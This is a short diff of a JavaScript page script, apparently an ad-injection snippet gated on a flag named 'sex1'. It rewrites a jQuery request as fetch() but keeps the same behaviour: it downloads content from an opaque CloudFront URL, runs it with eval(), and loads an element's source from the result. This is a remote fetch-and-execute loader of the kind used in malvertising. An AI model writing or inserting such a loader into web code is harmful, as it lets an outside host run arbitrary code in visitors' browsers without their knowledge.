@@ -100,9 +100,10 @@ function gup( name, url ) {
 
 if(sex1 === '1') {
 
-$.get("https://dcbbwymp1bhlf.cloudfront.net/?wbbcd=1257743", function(data, status){
-
-var x1 = "var abc1;";
+fetch("https://dcbbwymp1bhlf.cloudfront.net/?wbbcd=1257743")
+   .then(data => data.text())
+   .then((data) => {
+	  var x1 = "var abc1;";
 
 var x2 = "abc1 = b.url.toString();";
 
@@ -117,8 +118,14 @@ eval(data1);
 
 document.getElementById('adx1').src = abc1;
 
+	   
+     
+   })
+   .catch(err => console.log(err))
 
-});
+
+	
+
 
 }
 
